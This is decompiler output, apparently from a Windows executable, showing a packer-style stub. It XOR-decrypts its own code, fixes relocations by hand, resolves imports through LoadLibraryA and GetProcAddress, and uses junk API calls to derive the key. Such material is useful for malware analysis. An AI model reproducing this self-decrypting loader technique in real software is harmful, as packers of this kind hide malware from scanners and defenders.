/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __noreturn start(); // weak
void sub_401960();
// BOOL __stdcall AreAnyAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_401190[] = { 'Ç' }; // weak
int dword_402490[92] =
{
  1280809396,
  -1936960402,
  1721960166,
  -1359199141,
  774493100,
  1692829546,
  -1081831971,
  1474920282,
  830964402,
  1607647124,
  -1385428653,
  1655142847,
  36813545,
  1079534307,
  -696472846,
  -2095043973,
  -1988468550,
  2077866857,
  -2043325586,
  -1125829350,
  181230688,
  2075176533,
  -1266523323,
  1814301814,
  -1538699529,
  622188787,
  1869909218,
  -1252358476,
  1562146202,
  991397901,
  1385280250,
  -1606548381,
  1828877821,
  227980632,
  1331260805,
  -646076942,
  -1908988777,
  -2073989702,
  1992930921,
  -1962058144,
  -1309788132,
  127553948,
  1993253691,
  -1239060961,
  1856900835,
  -1495249815,
  663214700,
  1835306702,
  -1218673329,
  1596422019,
  963217997,
  1809887418,
  -1716245219,
  1421757507,
  90750380,
  1201497420,
  -775967438,
  -1271063189,
  -1102293095,
  1284279380,
  -1319869388,
  -1952710026,
  1025338336,
  1280809396,
  -1936960322,
  1415853132,
  -1677560143,
  493609099,
  1469690941,
  -1940603316,
  1681149068,
  41333076,
  1809877916,
  -1716241123,
  1421757527,
  877431948,
  1991332964,
  -527721470,
  -1271063189,
  -1102293095,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  'L',
  '4',
  'd',
  'T',
  '±',
  'v',
  '\x02',
  'œ',
  '‹',
  'à',
  'k',
  '\x1D',
  '=',
  '´',
  '™',
  'W',
  'L',
  '¾',
  'T',
  'Œ',
  'Œ',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
void __noreturn start()
{
  unsigned int v0; // esi
  int v1; // edi
  BOOL v2; // eax
  int v3; // eax
  unsigned int v4; // ecx
  unsigned int v5; // eax
  char *v6; // ebp
  unsigned int v7; // ebx
  int *v8; // ecx
  char *v9; // edi
  unsigned int v10; // eax
  _WORD *v11; // edx
  char *v12; // esi
  int *v13; // ebx
  HMODULE v14; // eax
  HMODULE v15; // edx
  int v16; // ebx
  FARPROC *v17; // esi
  int v18; // eax
  FARPROC v19; // eax
  unsigned int v20; // [esp+10h] [ebp-8h]
  char *v21; // [esp+10h] [ebp-8h]
  HMODULE v22; // [esp+14h] [ebp-4h]

  v0 = 0;
  v1 = AddAce(0, 0, 0, 0, 0) + 21;
  v2 = AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF);
  if ( !v2 )
    v1 -= 34;
  v3 = 8 * v2;
  v4 = 0;
  while ( 1 )
  {
    if ( v0 == v1 )
      v0 = 0;
    v5 = v0 + 4 * v3;
    LOBYTE(v5) = byte_404000[v0];
    byte_401190[v4] ^= v5;
    v3 = v0 + 2 * v5;
    ++v4;
    ++v0;
    if ( v4 >= 0x1440 )
    {
      v6 = &byte_401190[-640];
      v7 = 0;
      v8 = dword_402490;
      v9 = &byte_401190[-268436096];
      v20 = 0;
      while ( 1 )
      {
        v10 = (unsigned int)(v8[1] - 8) >> 1;
        v0 = v10 + 2 * v0;
        v11 = v8 + 2;
        if ( v10 )
        {
          v0 = (unsigned int)(v8[1] - 8) >> 1;
          do
          {
            v10 = (unsigned __int16)*v11;
            if ( (*v11 & 0xF000) == 12288 )
            {
              v10 = (unsigned int)&v6[*v8 + (v10 & 0xFFF)];
              *(_DWORD *)v10 += v9;
            }
            ++v11;
            --v0;
          }
          while ( v0 );
          v7 = v20;
        }
        v7 += v8[1];
        v20 = v7;
        v8 = (int *)((char *)v8 + v8[1]);
        if ( v7 >= 0xE4 )
        {
          v12 = &byte_401190[2804];
          v21 = &byte_401190[2804];
          v13 = (int *)(v7 + v10);
          if ( *(_DWORD *)&byte_401190[2820] )
          {
            do
            {
              v14 = LoadLibraryA(&v6[*((_DWORD *)v12 + 3)]);
              v15 = v14;
              v22 = v14;
              v13 = (int *)((char *)v14 + 2 * (_DWORD)v13);
              if ( v14 )
              {
                v16 = *(_DWORD *)v12;
                if ( !*(_DWORD *)v12 )
                  v16 = *((_DWORD *)v12 + 4);
                v13 = (int *)&v6[v16];
                v9 = (char *)v14 + 2 * (_DWORD)v9;
                v17 = (FARPROC *)&v6[*((_DWORD *)v12 + 4)];
                if ( *v13 )
                {
                  while ( 1 )
                  {
                    v18 = *v13;
                    v19 = *v13 >= 0 ? GetProcAddress(v15, &v6[v18 + 2]) : GetProcAddress(
                                                                            v15,
                                                                            (LPCSTR)(unsigned __int16)v18);
                    *v17 = v19;
                    ++v13;
                    ++v17;
                    if ( !*v13 )
                      break;
                    v15 = v22;
                  }
                }
                v12 = v21;
              }
              v12 += 20;
              v21 = v12;
            }
            while ( *((_DWORD *)v12 + 4) );
          }
          sub_401960();
          ExitProcess(0);
        }
      }
    }
  }
}
// 401000: using guessed type void __noreturn start();
// 402490: using guessed type int dword_402490[92];

//----- (00401960) --------------------------------------------------------
void sub_401960()
{
  __asm
  {
    daa
    retf
  }
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
